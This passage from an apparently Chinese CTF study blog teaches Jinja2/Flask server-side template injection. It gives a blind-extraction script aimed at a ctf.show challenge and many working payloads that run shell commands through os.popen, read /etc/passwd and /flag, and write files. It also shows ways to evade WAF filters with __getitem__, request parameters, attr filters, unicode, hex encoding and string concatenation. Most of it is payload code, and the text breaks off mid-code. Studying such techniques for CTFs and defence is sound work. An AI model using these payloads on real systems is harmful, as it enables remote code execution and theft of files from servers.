class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># coding=utf-8</span><br> <br>import requests<br> <br><span class="hljs-comment">#注意: 这里只适用于 &gt; 的情况</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">start</span> = <span class="hljs-number">1</span>  <span class="hljs-comment"># 第几个字符</span><br><span class="hljs-keyword">while</span> True:<br>    low = <span class="hljs-number">32</span> <br>    high = <span class="hljs-number">126</span><br>    <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2  # 整数除法</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        url = <span class="hljs-string">&quot;http://0b7c2aed-1a0a-4c5c-9829-2e1721548848.challenge.ctf.show/?name=&quot;</span><br>        payload =f<span class="hljs-string">&quot;&#123;&#123;% set a=(lipsum.__globals__.__builtins__.open(&#x27;/flag&#x27;).read(&#123;start&#125;)) %&#125;&#125;&#123;&#123;% if a&gt;&#x27;&#123;flag + chr(mid)&#125;&#x27;%&#125;&#125;lovone&#123;&#123;% endif %&#125;&#125;&quot;</span><br> <br>        url_payload = url + payload<br> <br>        <span class="hljs-comment"># 页面返回正常的特征值</span><br>        identify_str = <span class="hljs-string">&quot;lovone&quot;</span><br> <br>        <span class="hljs-comment"># 请求</span><br>        response = requests.<span class="hljs-built_in">get</span>(url=url_payload)<br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-keyword">if</span> identify_str <span class="hljs-keyword">in</span> response.<span class="hljs-keyword">text</span>:  <span class="hljs-comment"># 页面返回正常</span><br>            low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 页面返回异常</span><br>            high = <span class="hljs-keyword">mid</span><br>        <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2 </span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">mid</span> &lt;= <span class="hljs-number">32</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">mid</span> &gt;= <span class="hljs-number">126</span>:<br>            break<br>    <span class="hljs-keyword">if</span> chr(<span class="hljs-keyword">mid</span>) == <span class="hljs-string">&#x27; &#x27;</span>:<br>        break<br>    flag += chr(<span class="hljs-keyword">mid</span>)<br>    print(flag)<br>    <span class="hljs-built_in">start</span> += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><hr><h3 id="写入静态文件"><a href="#写入静态文件" class="headerlink" title="写入静态文件"></a>写入静态文件</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">先尝试写入</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;echo &quot;test&quot; &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">然后访问url/static/1.txt显示test</span><br><span class="language-xml">说明成功写入static静态目录</span><br><span class="language-xml"></span><br><span class="language-xml">将flag写入到static静态目录</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;echo `cat /app/flag` &gt;/app/static/1.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">然后访问url/static/1.txt即可拿到flag</span><br></code></pre></td></tr></table></figure><hr><h2 id="getitem绕过中括号过滤"><a href="#getitem绕过中括号过滤" class="headerlink" title="getitem绕过中括号过滤"></a>getitem绕过中括号过滤</h2><p>获取键值或下标</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dict<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><br>dict.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.pop</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>dict<span class="hljs-selector-class">.setdefault</span>(<span class="hljs-string">&#x27;__builtins__&#x27;</span>)<br>list<span class="hljs-selector-attr">[0]</span><br>list.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">0</span>)<br>list<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>原文链接：<a href="https://blog.csdn.net/2401_84009749/article/details/137661728">https://blog.csdn.net/2401_84009749/article/details/137661728</a></p><h3 id="getitem-魔术方法"><a href="#getitem-魔术方法" class="headerlink" title="__getitem__()魔术方法"></a>__getitem__()魔术方法</h3><p>getitem()是python的一个魔术方法，</p><p>对字典使用时，传入字符串，返回字典相应键所对应的值；</p><p>当对列表使用时，传入整数返回列表对应索引的值。</p><p>简单来说就是只要输入键就会返回值给我们。</p><p>绕过原理：</p><p>例如：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[117]</span>这里会被过滤，因为使用了中括号<br><br>因为<span class="hljs-built_in">__subclasses__</span>()返回的是列表，所以我们可以用<br><span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-class">.__getitem__</span>(<span class="hljs-number">117</span>)<br>这样等价于上面那个命令，并且没有使用中括号，所以就能成功绕过<br></code></pre></td></tr></table></figure><hr><h3 id="WAF过滤-例题"><a href="#WAF过滤-例题" class="headerlink" title="WAF过滤[]例题"></a>WAF过滤[]例题</h3><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#先检测双大括号是否被过滤</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;</span>&#125;&#125;</span><span class="language-xml">或</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;</span>&#125;&#125;</span><span class="language-xml">等</span><br><span class="language-xml">#检测是否有过滤符号</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#检测是否有下划线过滤或者特殊字符</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#到此步骤后发现有waf字样</span><br></code></pre></td></tr></table></figure><p>使用<code>__getitem()__</code>构造payload：</p><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;xxx&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>data = &#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;)&#125;&#125;&#x27;</span>&#125;<br><span class="hljs-keyword">try</span>:<br>response = requests.post(url,data=data)<br><span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;_wrap_close&quot;</span> <span class="hljs-keyword">in</span> response.text:<br><span class="hljs-built_in">print</span>(i,<span class="hljs-string">&quot;----&gt;&quot;</span>,respones.text)<br><span class="hljs-keyword">break</span><br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>构造最终payload：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>().__getitem__(<span class="hljs-name">117</span>).__init__.__globals__.__getitem__(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">更简便的payload。</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum.__globals__.get</span>(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="request绕过单双引号过滤"><a href="#request绕过单双引号过滤" class="headerlink" title="request绕过单双引号过滤"></a>request绕过单双引号过滤</h2><p><strong>查找’os._wrap_close’模块所在位置</strong></p><p>python脚本</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import requests<br>url = <span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">500</span>):<br>data = &#123;<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-string">&#x27;&#123;&#123;().__class__.__base__.__subclass__()[&#x27;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&#x27;]&#125;&#125;&#x27;</span>&#125;<br>try:<br>response = requests<span class="hljs-selector-class">.post</span>(url,data=data)<br><span class="hljs-keyword">if</span> response<span class="hljs-selector-class">.status_code</span> == <span class="hljs-number">200</span>:<br><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;_wrap_close&quot;</span> <span class="hljs-keyword">in</span> response<span class="hljs-selector-class">.text</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-selector-tag">i</span>,<span class="hljs-string">&quot;----&gt;&quot;</span>,response.text)<br>except:<br>pass<br></code></pre></td></tr></table></figure><hr><p><strong>request</strong></p><p>request在flask中可以访问基于HTTP请求传递的所有信息</p><p>此request并非python的函数，而是在flask内部的函数</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ruby">request.args.key获取get传入的key的值<br>request.values.x1所有参数<br>request.cookies获取cookies传入参数<br>request.headers获取请求头请求参数<br>request.form.key获取post传入参数<br>(<span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span><span class="hljs-symbol">:application/x-www-form-urlencoded</span>或multipart/form-data)<br>request.data获取post传入参数（<span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span><span class="hljs-symbol">:a/b</span>）<br>request.json获取post传入json参数（<span class="hljs-title class_">Content</span>-<span class="hljs-title class_">Type</span><span class="hljs-symbol">:application/json</span>）<br></code></pre></td></tr></table></figure><p>通过request各种形式的传参</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-11.png"></p><p>可以通过构造带参数的url，配合request获取参数的内容来组成想要提交的指令从而绕过单双引号的使用</p><p>假如我们想实现：</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.___base_</span>&#125;.__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>).read()&#125;</span><br></code></pre></td></tr></table></figure><p>但单引号被过滤了</p><p>因此<code>[&#39;popen&#39;]</code>和cat命令就实现不了</p><p>我们就能用request来把popen传进去</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.___base__.__subclasses__</span>()[117].__init__.__globals__[request.args.key1](<span class="hljs-name">key2</span>).read()&#125;</span><br><span class="hljs-template-variable"></span><br><span class="hljs-template-variable"><span class="hljs-attr">然后通过get传参?key1</span>=popen&amp;<span class="hljs-attr">key2</span>=cat /etc/passwd，这样就不用使用引号了</span><br><span class="hljs-template-variable"></span><br><span class="hljs-template-variable">也能用post提交</span><br><span class="hljs-template-variable">只要将request.args.key改为request.form.key就行了，然后用hackbar提交</span><br></code></pre></td></tr></table></figure><p>通过Cookie提交也可以，换成这种类型即可</p><p>request.cookies.k1</p><p>Cookie传参需要将参数用分号隔开</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Cookie：k1<span class="hljs-operator">=</span>popen<span class="hljs-comment">;k2=cat /etc/passwd</span><br>用hackbar提交<br></code></pre></td></tr></table></figure><hr><h2 id="过滤器绕过下划线过滤"><a href="#过滤器绕过下划线过滤" class="headerlink" title="过滤器绕过下划线过滤"></a>过滤器绕过下划线过滤</h2><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><p>1、过滤器通过管道符号（|）与变量连接，并且在括号中可能有可选的参数。</p><h3 id="flask常用过滤器"><a href="#flask常用过滤器" class="headerlink" title="flask常用过滤器"></a><strong>flask常用过滤器</strong></h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs scss">length# 获取一个序列或者一个字典的长度并将其返回<br><span class="hljs-built_in">int</span>()# 将值转换为int类型<br><span class="hljs-attribute">float</span>()# 将值转换为<span class="hljs-attribute">float</span>类型<br><span class="hljs-built_in">lower</span>()# 将字符串转换为小写<br><span class="hljs-built_in">upper</span>()# 将字符串转换为大写<br><span class="hljs-built_in">reverse</span>()# 反转字符串<br><span class="hljs-built_in">replace</span>(value,old,new)# 将value中的old替换为new<br><span class="hljs-built_in">list</span>()# 将变量转换为列表类型<br><span class="hljs-built_in">string</span>()# 将变量转换成字符串类型<br><span class="hljs-built_in">join</span>()# 将一个序列中的参数值拼接成字符串，通常有python内置的<span class="hljs-built_in">dict</span>()配合使用<br><span class="hljs-built_in">attr</span>()# 获取对象的属性<br></code></pre></td></tr></table></figure><hr><h3 id="attr绕过下划线过滤"><a href="#attr绕过下划线过滤" class="headerlink" title="attr绕过下划线过滤"></a>attr绕过下划线过滤</h3><h4 id="1-使用request方法"><a href="#1-使用request方法" class="headerlink" title="1.使用request方法"></a><strong>1.使用request方法</strong></h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">先选好完整的payload：</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>().__getitem__(<span class="hljs-name">117</span>).__init__.__globals__.__getitem__(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">GET提交：</span><br><span class="language-xml">URL?cla=__class__&amp;bas=__base__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;gei=__getitem__</span><br><span class="language-xml"></span><br><span class="language-xml">POST提交：</span><br><span class="language-xml">code=</span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">request.args.cla</span>)|attr(<span class="hljs-name">request.args.bas</span>)|attr(<span class="hljs-name">request.args.sub</span>)()|attr(<span class="hljs-name">request.args.gei</span>)(<span class="hljs-name">117</span>)|attr(<span class="hljs-name">request.args.ini</span>)|attr(<span class="hljs-name">request.args.glo</span>)|attr(<span class="hljs-name">request.args.gei</span>)(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>注意：</p><p>如果用了attr过滤器就不能用.来连接payload了。</p><p>如果要用下标不能在get传参中写，直接在后面加(数字)</p><hr><h4 id="2、使用unicode编码"><a href="#2、使用unicode编码" class="headerlink" title="2、使用unicode编码"></a>2、使用unicode编码</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&quot;__class__&quot;</span>)|attr(<span class="hljs-name">&quot;__base__&quot;</span>)|attr(<span class="hljs-name">&quot;__subclasses__&quot;</span>)()|attr(<span class="hljs-name">&quot;__getitem__&quot;</span>)(<span class="hljs-name">199</span>)|attr(<span class="hljs-name">&quot;__init__&quot;</span>)|attr(<span class="hljs-name">&quot;__globals__&quot;</span>)|attr(<span class="hljs-name">&quot;__getitem__&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;ls&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">unicode编码</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>)()|attr(<span class="hljs-name">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="hljs-name">199</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span>)|attr(<span class="hljs-name">&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;</span>)(<span class="hljs-name">&quot;os&quot;</span>)|attr(<span class="hljs-name">&quot;popen&quot;</span>)(<span class="hljs-name">&quot;ls&quot;</span>)|attr(<span class="hljs-name">&quot;read&quot;</span>)()&#125;&#125;</span><span class="language-xml"></span><br></code></pre></td></tr></table></figure><h4 id="3、使用十六进制编码或者八进制编码"><a href="#3、使用十六进制编码或者八进制编码" class="headerlink" title="3、使用十六进制编码或者八进制编码"></a>3、使用十六进制编码或者八进制编码</h4><p>把下划线都用\x5f来代替</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">code=&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fbase\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]</span>()<span class="hljs-selector-attr">[199]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;os&quot;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&quot;ls&quot;</span>)<span class="hljs-selector-class">.read</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="4、使用base64编码"><a href="#4、使用base64编码" class="headerlink" title="4、使用base64编码"></a>4、使用base64编码</h4><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-12.png"></p><h4 id="5、格式化字符串"><a href="#5、格式化字符串" class="headerlink" title="5、格式化字符串"></a>5、格式化字符串</h4><p>%c%(95)即下划线</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-13.png"></p><p>在hackbar内提交需要对%进行编码为%25才能提交</p><p>如果在输入框中可以直接提交</p><hr><h2 id="中括号绕过点过滤"><a href="#中括号绕过点过滤" class="headerlink" title="中括号绕过点过滤"></a>中括号绕过点过滤</h2><p><strong>1、用中括号[]代替点</strong></p><p><strong>python语法除了可以使用点’.’来访问对象属性外，还可以使用中括号’[]’</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">使用中括号绕过点过滤</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[&#x27;__class__&#x27;]</span>[&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[117][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;popen&#x27;][&#x27;cat /etc/passwd&#x27;][&#x27;read&#x27;]()&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>2、用|attr()绕过</strong></p><p><strong>payload语句中不会用到点’.’和中括号’[]’</strong></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;()|<span class="hljs-name">attr</span>(<span class="hljs-name">&#x27;__class__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__base__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="hljs-name">&#x27;__getitem__&#x27;</span>)(<span class="hljs-name">199</span>)|attr(<span class="hljs-name">&#x27;__init__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__globals__&#x27;</span>)|attr(<span class="hljs-name">&#x27;__getitem__&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;cat /etc/passwd&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><br></code></pre></td></tr></table></figure><hr><h2 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h2><p>过滤了”class” “arg“ “from” “value” “int” “globals”等关键字</p><p><img src="/../image/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5-14.png"></p><hr><h3 id="“-”拼接"><a href="#“-”拼接" class="headerlink" title="“+”拼接"></a>“+”拼接</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__class__&#x27;</span>]</span>&#125;&#125;-&gt;&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>]</span>&#125;&#125;<br><br>先构造完整payload<br>&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__class__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__base__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subclasses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__getitem__&#x27;</span>]</span>(<span class="hljs-number">199</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__inti&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__globals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__getitem__&#x27;</span>]</span>(&#x27;os&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;popen&#x27;</span>]</span>(&#x27;cat /etc/passwd&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;read&#x27;</span>]</span>()&#125;&#125;<br><br>用+拼接<br>&#123;&#123;()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__ba&#x27;</span>+<span class="hljs-string">&#x27;se__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subcl&#x27;</span>+<span class="hljs-string">&#x27;asses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__getitem__&#x27;</span>]</span>(<span class="hljs-number">199</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__in&#x27;</span>+<span class="hljs-string">&#x27;ti&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__gl&#x27;</span>+<span class="hljs-string">&#x27;obals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__getitem__&#x27;</span>]</span>(&#x27;os&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;po&#x27;</span>+<span class="hljs-string">&#x27;pen&#x27;</span>]</span>(&#x27;cat /etc/passwd&#x27;)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;read&#x27;</span>]</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="jinjia2中的”-”拼接"><a href="#jinjia2中的”-”拼接" class="headerlink" title="jinjia2中的”~”拼接"></a>jinjia2中的”~”拼接</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;&#123;()[<span class="hljs-string">&#x27;__class__&#x27;</span>]&#125;&#125;--&gt; &#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;__cla&#x27;</span>%&#125;&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">b</span>=<span class="hljs-string">&#x27;ss__&#x27;</span>%&#125;&#123;&#123;()[a~b]&#125;&#125;<br><br>先构造完整payload<br>&#123;&#123;()[<span class="hljs-string">&#x27;__class__&#x27;</span>][<span 